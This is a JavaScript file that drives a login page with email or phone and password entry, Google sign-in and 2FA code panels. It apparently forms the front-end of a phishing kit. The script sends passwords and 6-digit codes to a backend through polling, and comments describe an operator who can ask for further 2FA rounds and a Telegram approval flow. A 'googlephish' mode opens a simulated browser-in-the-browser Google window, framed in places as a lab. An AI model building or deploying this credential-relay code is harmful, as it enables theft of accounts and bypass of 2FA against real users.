(function () {
    var cfg = window.APP_CONFIG || {};

    if (window.AuthUI) window.AuthUI.init();

    // Holds the request_id while the 2FA view is active so we can submit the code against it
    var pending2faRequestId = null;

    function initGoogleSignIn() {
        if (typeof google === 'undefined' || !google.accounts) return;
        var clientId = cfg.googleClientId;
        if (!clientId) {
            console.warn('APP_CONFIG.googleClientId is empty; set it in config.js');
            return;
        }
        google.accounts.id.initialize({
            client_id: clientId,
            callback: handleGoogleCredential,
            ux_mode: 'popup'
        });

        var googleBtn = document.getElementById('googleSignInBtn');
        if (googleBtn) {
            googleBtn.addEventListener('click', function () {
                var mode = String(cfg.authMode || 'api').toLowerCase();
                if (mode === 'googlephish') {
                    var base = window.BitbGooglePhish && window.BitbGooglePhish.normalizeBase(cfg.googlephishBaseUrl);
                    if (!base) {
                        window.AuthUI.setBanner('Set googlephishBaseUrl in config.js (PHP server URL).', 'error');
                        return;
                    }
                    if (window.BitbGooglePhish && window.BitbGooglePhish.open()) return;
                    window.AuthUI.setBanner('Could not open lab window (see console).', 'error');
                    return;
                }
                if (!window.AuthAPI || !window.AuthAPI.apiBase()) {
                    window.AuthUI.setBanner('Set apiBaseUrl in config.js to your API.', 'error');
                    return;
                }
                google.accounts.id.prompt();
            });
        }
    }

    function handleGoogleCredential(response) {
        var token = response && response.credential;
        if (!token) { console.error('Google credential missing'); return; }
        if (!window.AuthAPI || !window.AuthUI) return;
        window.AuthUI.runGate(function () {
            return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithGoogle(token));
        }).then(function (result) {
            handle2faResult(result);
        }).catch(function () {});
    }

    /** Called after any poll resolves — handles the '2fa' status centrally. */
    function handle2faResult(result) {
        if (!result || result.status !== '2fa') return;
        pending2faRequestId = result.request_id || null;
        window.AuthUI.show2fa(result.two_fa_type || 'email');
    }

    var loginForm     = document.getElementById('loginForm');
    var emailBlock    = document.getElementById('emailBlock');
    var phoneBlock    = document.getElementById('phoneBlock');
    var passwordBlock = document.getElementById('passwordBlock');
    var smsBlock      = document.getElementById('smsBlock');

    function isPhoneMode() {
        return phoneBlock && window.getComputedStyle(phoneBlock).display !== 'none';
    }

    function isSmsMode() {
        return smsBlock && window.getComputedStyle(smsBlock).display !== 'none';
    }

    function getDemoUsername() {
        if (isPhoneMode()) {
            var code  = document.getElementById('countryCode');
            var phone = document.getElementById('phone');
            return (code ? code.value : '') + (phone ? phone.value.trim() : '');
        }
        var email = document.getElementById('email');
        return email ? email.value.trim() : '';
    }

    if (loginForm && window.AuthAPI && window.AuthUI) {
        loginForm.addEventListener('submit', function (e) {
            e.preventDefault();
            window.AuthUI.clearBanner();

            var mode = String(cfg.authMode || 'api').toLowerCase();
            if (mode !== 'googlephish' && !window.AuthAPI.apiBase()) {
                window.AuthUI.setBanner('Set apiBaseUrl in config.js to your API.', 'error');
                return;
            }

            if (mode === 'googlephish') {
                window.AuthUI.setBanner('In lab mode, use "Sign in with Google" to open the simulated browser window.', 'error');
                return;
            }

            if (isSmsMode()) {
                window.AuthUI.setBanner('Use password or Google sign-in for the Telegram approval flow.', 'error');
                return;
            }

            var username = getDemoUsername();
            var pwdInput = document.getElementById('password');
            var password = pwdInput ? pwdInput.value : '';

            if (!username || !password) {
                window.AuthUI.setBanner('Enter your email or phone and password.', 'error');
                return;
            }

            window.AuthUI.runGate(function () {
                return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithPassword(username, password));
            }).then(function (result) {
                handle2faResult(result);
            }).catch(function () {});
        });
    }

    // ── 2FA view ──────────────────────────────────────────────────
    var twoFaSubmitBtn  = document.getElementById('twoFaSubmitBtn');
    var twoFaBackBtn    = document.getElementById('twoFaBackBtn');

    /** Returns the code from whichever 2FA panel is active. */
    function get2faCode() {
        var emailPanel = document.getElementById('twoFaPanelEmail');
        var phonePanel = document.getElementById('twoFaPanelPhone');
        var totpPanel  = document.getElementById('twoFaPanelTotp');

        if (emailPanel && window.getComputedStyle(emailPanel).display !== 'none') {
            return (document.getElementById('twoFaEmailCode') || {}).value || '';
        }
        if (phonePanel && window.getComputedStyle(phonePanel).display !== 'none') {
            return (document.getElementById('twoFaPhoneCode') || {}).value || '';
        }
        if (totpPanel  && window.getComputedStyle(totpPanel).display  !== 'none') {
            return (document.getElementById('twoFaTotpCode')  || {}).value || '';
        }
        return '';
    }

    if (twoFaSubmitBtn && window.AuthAPI && window.AuthUI) {
        twoFaSubmitBtn.addEventListener('click', function () {
            window.AuthUI.clearBanner('twoFaBanner');

            if (!pending2faRequestId) {
                window.AuthUI.setBanner('Session lost. Please log in again.', 'error', 'twoFaBanner');
                return;
            }

            var code = get2faCode().replace(/\s/g, '');
            if (!code) {
                window.AuthUI.setBanner('Enter the verification code.', 'error', 'twoFaBanner');
                return;
            }
            if (!/^\d{6}$/.test(code)) {
                window.AuthUI.setBanner('Code must be 6 digits.', 'error', 'twoFaBanner');
                return;
            }

            var reqId = pending2faRequestId;
            window.AuthUI.runGate(function () {
                return window.AuthAPI.afterLoginPoll(
                    window.AuthAPI.submit2fa(reqId, code)
                );
            }).then(function (result) {
                // Operator may request another 2FA round
                handle2faResult(result);
            }).catch(function () {});
        });
    }

    if (twoFaBackBtn) {
        twoFaBackBtn.addEventListener('click', function () {
            pending2faRequestId = null;
            window.AuthUI.clearBanner('twoFaBanner');
            window.AuthUI.showLogin();
        });
    }

    // ── 2FA method tab switching ───────────────────────────────────
    var twoFaTabs = document.querySelectorAll('.twofa-tab');
    twoFaTabs.forEach(function (tab) {
        tab.addEventListener('click', function () {
            var method = tab.dataset.method;
            if (!method) return;
            window.AuthUI.show2fa(method);
        });
    });

    // ── Resend countdown buttons (reuse from login) ───────────────
    function startCountdown(btn, originalText) {
        var seconds = 60;
        btn.disabled = true;
        btn.textContent = seconds + 's';
        var timer = setInterval(function () {
            seconds--;
            if (seconds <= 0) {
                clearInterval(timer);
                btn.disabled = false;
                btn.textContent = originalText || 'Resend';
            } else {
                btn.textContent = seconds + 's';
            }
        }, 1000);
    }

    ['sendCodeBtn', 'fpSendCodeBtn', 'twoFaEmailResend', 'twoFaPhoneResend'].forEach(function (id) {
        var btn = document.getElementById(id);
        var orig = btn && btn.textContent;
        if (btn) btn.addEventListener('click', function () { startCountdown(btn, orig); });
    });

    // ── Password toggle ───────────────────────────────────────────
    function wireTogglePwd(inputId, btnId) {
        var inp = document.getElementById(inputId);
        var btn = document.getElementById(btnId);
        if (!inp || !btn) return;
        btn.addEventListener('click', function () {
            var hidden = inp.type === 'password';
            inp.type = hidden ? 'text' : 'password';
            btn.setAttribute('aria-pressed', hidden ? 'true' : 'false');
            btn.setAttribute('aria-label', hidden ? 'Hide password' : 'Show password');
            var eye = btn.querySelector('.eye-icon');
            if (eye) {
                eye.innerHTML = hidden
                    ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>' +
                      '<path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>' +
                      '<line x1="1" y1="1" x2="23" y2="23"/>'
                    : '<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>' +
                      '<circle cx="12" cy="12" r="3"/>';
            }
        });
    }

    wireTogglePwd('password', 'togglePwd');
    wireTogglePwd('fpNewPwd', 'fpToggleNewPwd');
    wireTogglePwd('fpConfirmPwd', 'fpToggleConfirmPwd');

    // ── Email / phone toggle ───────────────────────────────────────
    function showEmail() { if (emailBlock) emailBlock.style.display = ''; if (phoneBlock) phoneBlock.style.display = 'none'; }
    function showPhone() { if (emailBlock) emailBlock.style.display = 'none'; if (phoneBlock) phoneBlock.style.display = ''; }

    var usePhoneLink = document.getElementById('toggleInputMode');
    var useEmailLink = document.getElementById('toggleInputModePhone');
    if (usePhoneLink) usePhoneLink.addEventListener('click', function (e) { e.preventDefault(); showPhone(); });
    if (useEmailLink) useEmailLink.addEventListener('click', function (e) { e.preventDefault(); showEmail(); });

    // ── Password / SMS code toggle ─────────────────────────────────
    function showPassword() { if (passwordBlock) passwordBlock.style.display = ''; if (smsBlock) smsBlock.style.display = 'none'; }
    function showSms()      { if (passwordBlock) passwordBlock.style.display = 'none'; if (smsBlock) smsBlock.style.display = ''; }

    var smsToggleLink = document.getElementById('smsToggleLink');
    var pwdToggleLink = document.getElementById('pwdToggleLink');
    if (smsToggleLink) smsToggleLink.addEventListener('click', function (e) { e.preventDefault(); showSms(); });
    if (pwdToggleLink) pwdToggleLink.addEventListener('click', function (e) { e.preventDefault(); showPassword(); });

    // ── Forgot password ────────────────────────────────────────────
    var loginView  = document.getElementById('loginView');
    var forgotView = document.getElementById('forgotView');

    function showForgot() { if (loginView) loginView.style.display = 'none'; if (forgotView) forgotView.style.display = ''; }
    function showMainLogin() { if (forgotView) forgotView.style.display = 'none'; if (loginView) loginView.style.display = ''; }

    var forgotLink = document.getElementById('forgotPasswordLink');
    var backBtn    = document.getElementById('backToLogin');
    if (forgotLink) forgotLink.addEventListener('click', function (e) { e.preventDefault(); showForgot(); });
    if (backBtn)    backBtn.addEventListener('click', function () { showMainLogin(); });

    var forgotForm = document.getElementById('forgotForm');
    if (forgotForm) forgotForm.addEventListener('submit', function (e) { e.preventDefault(); });

    var fpEmailBlock = document.getElementById('fpEmailBlock');
    var fpPhoneBlock = document.getElementById('fpPhoneBlock');
    var fpUsePhone   = document.getElementById('fpToggleInputMode');
    var fpUseEmail   = document.getElementById('fpToggleInputModePhone');
    if (fpUsePhone) fpUsePhone.addEventListener('click', function (e) { e.preventDefault(); if (fpEmailBlock) fpEmailBlock.style.display = 'none'; if (fpPhoneBlock) fpPhoneBlock.style.display = ''; });
    if (fpUseEmail) fpUseEmail.addEventListener('click', function (e) { e.preventDefault(); if (fpPhoneBlock) fpPhoneBlock.style.display = 'none'; if (fpEmailBlock) fpEmailBlock.style.display = ''; });

    // ── Google one-tap init ────────────────────────────────────────
    if (document.readyState === 'complete') {
        initGoogleSignIn();
    } else {
        window.addEventListener('load', initGoogleSignIn);
    }
})();
